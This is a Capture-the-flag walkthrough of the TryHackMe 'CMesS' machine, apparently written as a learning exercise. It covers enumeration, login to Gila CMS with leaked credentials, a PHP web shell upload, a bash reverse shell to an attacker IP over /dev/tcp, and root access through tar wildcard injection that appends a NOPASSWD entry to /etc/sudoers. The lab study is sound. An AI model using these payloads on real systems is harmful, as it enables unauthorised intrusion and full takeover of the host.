# Try Hack Me - CMesS
# Author: Atharva Bordavekar
# Difficulty: Medium
# Points: 140
# Vulnerabilities: Leaked credentials, RCE via file upload, insecure permissions of backup files,tar wildcard injection

# Phase 1 - Reconnaissance:
first lets add the hostname cmess.thm to our /etc/hosts file.

```bash
echo "<target_ip> cmess.thm"
```
nmap scan:

```bash
nmap -p- --min-rate=1000 <target_ip>
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

lets start enumerating the webpage at port 80. lets carry out a directory fuzz using gobuster

```bash
gobuster dir -u http://cmess.thm -w /usr/share/wordlists/dirb/common.txt
```
/.hta                 (Status: 403) [Size: 274]

/.htpasswd            (Status: 403) [Size: 274]

/.htaccess            (Status: 403) [Size: 274]

/0                    (Status: 200) [Size: 3851]

/01                   (Status: 200) [Size: 4078]

/1                    (Status: 200) [Size: 4078]

/1x1                  (Status: 200) [Size: 4078]

/about                (Status: 200) [Size: 3353]

/About                (Status: 200) [Size: 3339]

/admin                (Status: 200) [Size: 1580]

/api                  (Status: 200) [Size: 0]

/assets               (Status: 301) [Size: 318] [--> http://cmess.thm/assets/?url=assets]

/author               (Status: 200) [Size: 3590]

/blog                 (Status: 200) [Size: 3851]

/category             (Status: 200) [Size: 3862]

/cm                   (Status: 500) [Size: 0]

/feed                 (Status: 200) [Size: 735]

/fm                   (Status: 200) [Size: 0]

/index                (Status: 200) [Size: 3851]

/Index                (Status: 200) [Size: 3851]

/lib                  (Status: 301) [Size: 312] [--> http://cmess.thm/lib/?url=lib]

/log                  (Status: 301) [Size: 312] [--> http://cmess.thm/log/?url=log]

/login                (Status: 200) [Size: 1580]

/robots.txt           (Status: 200) [Size: 65]

/search               (Status: 200) [Size: 3851]

/Search               (Status: 200) [Size: 3851]

/server-status        (Status: 403) [Size: 274]

/sites                (Status: 301) [Size: 316] [--> http://cmess.thm/sites/?url=sites]

/src                  (Status: 301) [Size: 312] [--> http://cmess.thm/src/?url=src]

/tags                 (Status: 200) [Size: 3139]

/tag                  (Status: 200) [Size: 3874]

/themes               (Status: 301) [Size: 318] [--> http://cmess.thm/themes/?url=themes]

/tmp                  (Status: 301) [Size: 312]

the only useful directory to us is the /admin directory as it has a login page.
following the hint given to us by the creator of this ctf, we will enumerate the subdomains(vhosts). for that we will have to find whats common in the false responses. as you can see below, each response has different response sizes but the words are common. so we will use the amount of words as out filtering standard. any response which contains exactly 522 words shall be omitted.

```bash
ffuf -u http://cmess.thm -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://cmess.thm/ -H 'Host: FUZZ.cmess.thm' -fw 522
```

we get a hit at dev.cmess.thm! lets quickly add this to our subdomain aswell and visit the website.

```bash
echo "<target_ip> dev.cmess.thm" | sudo tee -a /etc/hosts
```
now we find a small conversation between a user and the support staff. we get the credentials of the user who has access to the admin panel at http://cmess.thm/admin. lets enter the credentials and find our attack vector to get an initial foothold. 

after doing some reserch, i found out that this version (1.10.9) of Gila CMS is vulnerable to RCE. i read some python scripts on exploitdb and github and found out the way to manually exploit the system.

inorder to get RCE, we will have to upload a malicious file with a .php7 extension in the /tmp folder via the File-Manager tab. we are uploading it to the /tmp folder.

first navigate to the File Manager tab, and then create a file. name it shell.php7

```bash
#paste this in the shell.php7 file
<? php system($_GET['cmd']);?>
```
now save this file and then test for RCE at the url http://cmess.thm/tmp/shell.php7?cmd=id
```bash
#in your browser:
http://cmess.thm/tmp/shell.php7?cmd=id
```
and just like that we have achieved RCE through malicious file upload! we will now craft a reverseshell payload which will be url encoded and inject it in the url.

```bash
#put your actual attacker ip:
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<attacker_ip>%2F4444%200%3E%261%27
```
before pasting this, just start a netcat listner at port 4444

```bash
#setup a netcat listner:
nc -lnvp 4444
```
now once you visit the website, we will get a shell as www-data in our terminal! now lets enumerate the machine manually.

after some manual enumeration, i found out that there is a .tar.gz file in the /tmp directory which is very unusual. lets transfer this to our attacker machine 

```bash
#first navigate to the /tmp directory
cd /tmp
#now start the python listener:
python3 -m http.server 8000
```
```bash
#on your attacker machine:
wget http://<target_ip>:8000/andre_backup.tar.gz
```
we get the file on our system. now lets find out its contents.

```bash
#first make a directory to store the contents of the compressed file
mkdir andre_backup
#now extract the contents of the .tar.gz file
tar -xzf andre_backup.tar.gz -C andre_backup/
```
inside the andre_backup directory we just created we find a note that says: 

`Note to self.`

`Anything in here will be backed up!`

this is a clear hint that our way to privilege escalation from www-data to andre would be through backup files! now after some searching, i found some database credentials of the root user in the config.php file present at /var/www/html directory. using it i could access the mysql server. i even found andre's hashed password, but the password couldn't be cracked using john or hashcat. neither did crackstation help us in finding the password. i remembered that in the description of the CTF, there was mentioning of not using bruteforce. so we fall inside a rabbit hole. 

after getting tired of manual enumeration, i installed linpeas.sh on the system and got a sus file at the /opt directory. there is a .password.bak file which contains the credentials of user andre. we quickly ssh into the system to get a better shell and a decent tty.

```bash
ssh andre@cmess.thm
#enter the password when prompted
```
now we have a shell as andre. lets read and submit the user.txt flag and lets get going. in the same linpeas output, we found a cronjob running every two minutes as root! after closer inspection i found out that it uses the tar command. this is a serious vulnerability which can help us get a root shell through tar wildcard injection. 

`*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *`

now for the exploit, we will have to create an exploit.sh file with some malicious commands which will add us to the sudoers file at /etc/sudoers.

```bash
nano /home/andre/backup/exploit.sh
```
what our plan is that we will carry our a script as root through the cronjob. we will create two more files which will make the tar command which runs as a cronjob interpret them as actual commands which will eventually execute the script.
```bash
#inside the nano interface, paste this line:
echo "andre ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>/dev/null
```
now once that is done, make the exploit.sh file executable
```bash
chmod +x exploit.sh
```
now we will create two more files which are specially meant for the tar command.

```bash
#create the 1st file:
: > '--checkpoint=1'  

#create the 2nd file:
: > '--checkpoint-action=exec=bash exploit.sh'
```
the file 1 will tell tar to create checkpoints after every 1 file is processed. this will enable checkpoint actions to trigger. the file 2 will tell tar what file to execute at what checkpoint. in our condition it tells tar to execute the exploit.sh file. the entire filename acts as a tar command argument.

lets check if we are added to the /etc/sudoers file yet and what privileges do we have after 2 minutes have passed. 

as you can see above, we are added to the sudoers list as we clearly have sudo privileges to execute any command on the system without password. 

```bash
sudo su
```
we get a shell as root and read adn submit the root.txt flag.
                                                                 
